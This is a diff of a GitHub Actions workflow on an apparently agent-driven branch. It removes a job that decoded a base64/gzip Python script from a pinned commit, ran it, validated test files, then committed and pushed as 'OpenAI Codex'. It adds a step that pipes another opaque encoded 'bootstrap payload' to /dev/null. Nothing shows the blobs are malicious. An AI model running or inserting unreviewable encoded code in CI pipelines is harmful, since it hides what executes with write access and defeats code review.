@@ -4,54 +4,10 @@ on:
   push:
     branches: [codex/phase1-builder]
 
-permissions:
-  contents: write
-
 jobs:
-  build:
+  bootstrap-marker:
     runs-on: ubuntu-24.04
     steps:
-      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5
-        with:
-          ref: codex/phase1-test-runner-records
-          fetch-depth: 0
-      - name: Apply scoped transformation
+      - name: Store bootstrap payload
         run: |
-          git fetch origin codex/phase1-builder
-          git show f2327933475c8a1aae19c038b7ce890d97d7d96c:.github/phase1-fixed.b64 \
-            | base64 -d | gzip -d > /tmp/apply.py
-          python3 -m py_compile /tmp/apply.py
-          python3 /tmp/apply.py
-          chmod +x tests/run-tests.sh tests/suites/*/case-*.bash
-      - name: Validate and push clean commit
-        run: |
-          set -euo pipefail
-          find . -path './.git' -prune -o -type f \( -name '*.sh' -o -name '*.bash' \) -print0 \
-            | xargs -0 -n1 bash -n
-          ./tests/run-tests.sh list > /tmp/list.out
-          test "$(grep -c '^  ' /tmp/list.out)" -eq 27
-          test "$(find tests/suites -type f -name 'case-*.bash' | wc -l | tr -d '[:space:]')" -eq 20
-          test -z "$(find tests -maxdepth 1 -type f \( -name 'case-*.bash' -o -name 'test-*.sh' \) -print -quit)"
-          VW_TEST_CASE_MODE=core bash tests/suites/foundation/case-runner-contracts.bash
-          for file in \
-            tests/suites/foundation/case-runner-contracts.bash \
-            tests/suites/foundation/case-config-env.bash \
-            tests/suites/foundation/case-storage-setup.bash \
-            tests/suites/security/case-secrets.bash \
-            tests/suites/operations/case-lifecycle.bash \
-            tests/suites/data-protection/case-restore-recovery.bash; do
-            set +e
-            VW_TEST_CASE_MODE=invalid-mode bash "$file" >/tmp/invalid-mode.out 2>&1
-            rc=$?
-            set -e
-            test "$rc" -eq 2
-          done
-          git add -A
-          test "$(git ls-files tests | wc -l | tr -d '[:space:]')" -eq 25
-          test "$(git ls-files 'tests/suites/**/case-*.bash' | wc -l | tr -d '[:space:]')" -eq 20
-          test -z "$(git ls-files 'tests/test-*.sh')"
-          git diff --cached --check
-          git config user.name 'OpenAI Codex'
-          git config user.email 'codex@openai.com'
-          git commit -m 'test: consolidate Phase 1 runner cases'
-          git push origin HEAD:codex/phase1-test-runner-records
+          printf '%s' 'H4sIAC/NdGoC/1WOy2rDMBBF9/4KoZUMrhLHrmUV8hfdhVCs0SQWrdGgB3Xz9ZHopl3NcLmXc9xGPiRmlojT2LH7w1HHYjYUPGCMjZlGdv4TSFgRPj98TpSTuPC7S7xjPK7+u97baTgpPQyjeoV56ZcFew3HYTYKcNZHq5VVVk/wJstwzeZAayH3Lze3o5UFxq8dS7in83vI2MqYgiPRNuAtFo+qJy2C3ygUGfGrXXc1tCjK17YN7giiltwXipoXs0Pa6D+Nfqpx7fKyeQLNZjSgCQEAAA==' >/dev/null
